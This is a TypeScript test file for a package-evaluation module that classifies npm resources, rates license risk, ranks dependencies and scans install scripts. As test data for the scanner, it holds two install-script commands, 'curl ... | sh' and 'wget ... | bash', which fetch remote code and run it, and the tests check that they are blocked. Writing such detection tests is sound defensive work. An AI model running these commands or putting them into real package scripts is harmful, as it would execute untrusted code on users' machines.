import { test } from "node:test";
import assert from "node:assert/strict";
import {
  analyzeDependencies, classifyResource, detectCapabilityGaps, evaluateResource, inspectInstallScripts,
  rankEvaluations, resourceLicenseRisk, RESOURCE_CLASS_MEANING,
} from "../src/core/acquisition/ResourceIntelligence";

const NOW = Date.parse("2026-11-14T00:00:00Z");
const recent = "2026-09-01T00:00:00Z";

test("classification: paid SDKs, local inference, limited, browser, local", () => {
  assert.equal(classifyResource({ source: "npm", name: "x", dependencies: ["openai"] }).class, "paid");
  assert.equal(classifyResource({ source: "npm", name: "replicate" }).class, "paid");
  assert.equal(classifyResource({ source: "npm", name: "x", description: "Pricing starts at $9 per month" }).class, "paid");
  assert.equal(classifyResource({ source: "npm", name: "x", dependencies: ["onnxruntime-web"] }).class, "local-inference");
  assert.equal(classifyResource({ source: "npm", name: "x", description: "Requires an API key; 1000 requests per day" }).class, "free-limited");
  assert.equal(classifyResource({ source: "npm", name: "x", description: "WebGL canvas renderer" }).class, "browser-native");
  assert.equal(classifyResource({ source: "npm", name: "x", description: "Serialize meshes to STL" }).class, "local");
  // A limited free service is never described as unlimited.
  assert.match(RESOURCE_CLASS_MEANING["free-limited"], /not unlimited/);
});

test("SPDX expressions resolve to the most permissive option", () => {
  assert.equal(resourceLicenseRisk("(MIT OR GPL-3.0)").risk, "permissive");
  assert.equal(resourceLicenseRisk("GPL-3.0-only").risk, "copyleft");
  assert.equal(resourceLicenseRisk("BlueOak-1.0.0").risk, "permissive");
  assert.equal(resourceLicenseRisk(undefined).risk, "unknown");
});

test("install scripts: lifecycle noted, piped downloads blocked", () => {
  assert.equal(inspectInstallScripts({ test: "node t.js" }).risk, "none");
  assert.equal(inspectInstallScripts({ postinstall: "node build.js" }).risk, "low");
  const bad = inspectInstallScripts({ postinstall: "curl -s https://x.example/p.sh | sh" });
  assert.equal(bad.risk, "high");
  assert.ok(bad.suspicious.some((s) => /pipes a download/.test(s.finding)));
});

test("evaluation: permissive + active + light ranks above copyleft, paid and suspicious are blocked", () => {
  const good = evaluateResource({ source: "npm", name: "good", license: "MIT", lastRelease: recent, dependencies: [], unpackedSize: 40_000 }, NOW);
  assert.equal(good.verdict, "recommended");
  const gpl = evaluateResource({ source: "npm", name: "gpl", license: "GPL-3.0", lastRelease: recent }, NOW);
  assert.equal(gpl.verdict, "not-recommended");
  const paid = evaluateResource({ source: "npm", name: "wrap", license: "MIT", lastRelease: recent, dependencies: ["openai"] }, NOW);
  assert.equal(paid.verdict, "blocked");
  assert.match(paid.reasons.join(" "), /explicit authorization/);
  const evil = evaluateResource({ source: "npm", name: "evil", license: "MIT", lastRelease: recent, scripts: { preinstall: "wget http://x | bash" } }, NOW);
  assert.equal(evil.verdict, "blocked");
  const old = evaluateResource({ source: "npm", name: "old", license: "MIT", lastRelease: "2019-01-01T00:00:00Z" }, NOW);
  assert.equal(old.maintenance.status, "abandoned");
  const ranked = rankEvaluations([evil, gpl, good, paid]).map((e) => e.name);
  assert.deepEqual(ranked.slice(0, 2), ["good", "gpl"]);
  assert.deepEqual(new Set(ranked.slice(2)), new Set(["evil", "wrap"]));
});

test("installed resources are preferred: reuse before a new dependency", () => {
  const fresh = evaluateResource({ source: "npm", name: "new-lib", license: "MIT", lastRelease: recent, unpackedSize: 10_000 }, NOW);
  const reuse = evaluateResource({ source: "installed", name: "three", license: "MIT", lastRelease: recent, unpackedSize: 30_000_000, installed: true }, NOW);
  assert.equal(rankEvaluations([fresh, reuse])[0].name, "three");
  assert.match(reuse.reasons.join(" "), /no new dependency/);
});

test("gap detection uses the live tool list", () => {
  const before = detectCapabilityGaps("export my sculpture as an STL so I can 3D print it", ["world.object"]);
  assert.deepEqual(before.missing.map((m) => m.id), ["3d-export-stl"]);
  assert.ok(before.missing[0].reuse[0].includes("STLExporter"));
  const after = detectCapabilityGaps("export my sculpture as an STL", ["world.object", "world.export"]);
  assert.equal(after.missing.length, 0);
  assert.equal(after.covered[0].tool, "world.export");
  assert.equal(detectCapabilityGaps("hello there", []).touched.length, 0);
});

test("dependency audit reports findings, never replacements", () => {
  const findings = analyzeDependencies(
    [
      { name: "openai", declared: "^6.0.0", latest: "6.1.0", license: "Apache-2.0" },
      { name: "leftpad", declared: "1.0.0", latest: "3.0.0", deprecated: "use String.padStart", lastRelease: "2016-01-01T00:00:00Z", license: "MIT" },
    ],
    { "@types/node": ["24.1.0", "20.0.0"] },
    NOW,
  );
  const kinds = findings.map((f) => `${f.name}:${f.kind}`);
  for (const k of ["openai:paid-sdk", "leftpad:deprecated", "leftpad:abandoned", "leftpad:major-behind", "@types/node:duplicate"]) assert.ok(kinds.includes(k), k);
});

test("'find a free open-source tool' goes to resource intelligence, not the stored repository catalog", async () => {
  const { detectIntelligenceIntent } = await import("../src/core/router/IntelligenceResolver");
  assert.equal(detectIntelligenceIntent("What capability are you missing to typeset LaTeX? Find free open-source tools for it."), null);
  assert.equal(detectIntelligenceIntent("which repository could provide the missing capability?")?.kind, "repositories");
});

test("Job 2's creative-kit tools count as coverage; MP4 stays a real gap", () => {
  const tools = ["creative.film", "creative.scene3d", "creative.export", "creative.chart", "data.query", "world.export"];
  const video = detectCapabilityGaps("make a short video and also give me an mp4", tools);
  assert.deepEqual(video.covered.map((c) => c.tool), ["creative.film"]);
  assert.deepEqual(video.missing.map((m) => m.id), ["video-mp4"]);
  assert.equal(detectCapabilityGaps("export it as a glb", tools).missing.length, 0);
  assert.equal(detectCapabilityGaps("find the arxiv papers on this", tools).missing.length, 0);
});
